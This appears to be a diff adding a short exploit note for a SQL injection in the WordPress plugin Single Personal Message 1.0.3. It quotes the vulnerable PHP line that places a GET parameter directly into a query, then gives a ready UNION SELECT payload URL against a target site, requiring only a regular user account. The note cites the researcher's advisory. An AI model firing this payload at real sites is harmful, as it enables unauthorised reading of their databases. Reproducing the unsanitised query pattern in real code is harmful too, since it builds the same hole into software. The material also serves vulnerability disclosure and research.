@@ -1,0 +1,22 @@
+
+### FOR WORDRESS ###
+
+# SQL Injection
+
+  ### Single Personal Message 1.0.3 ###
+    Path: /wp-content/plugins/simple-personal-message/admin/partials/simple-personal-message-admin-view.php
+
+    Line: 25
+
+      <?php
+      global $wpdb;
+      $table = $wpdb->prefix . 'spm_message';
+      $id = esc_attr($_GET['message']);
+      $message = $wpdb->get_results("SELECT * FROM $table WHERE id = $id");
+      $user = get_user_by('login', $message[0]->sender);
+      ?>
+
+      # NEED TO BE ALREADY REGISTRED AS A REGULAR USER
+      # TARGET URL: http://target/wp-admin/admin.php?page=simple-personal-message-outbox&action=view&message=0%20UNION%20SELECT%201,2.3,name,5,slug,7,8,9,10,11,12%20FROM%20wp_terms%20WHERE%20term_id=1
+
+    http://lenonleite.com.br/en/blog/2016/12/05/single-personal-message-1-0-3-plugin-wordpress-sql-injection/
